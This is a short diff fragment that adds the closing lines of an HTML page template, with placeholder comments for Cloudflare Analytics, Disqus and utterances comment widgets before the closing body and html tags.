+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
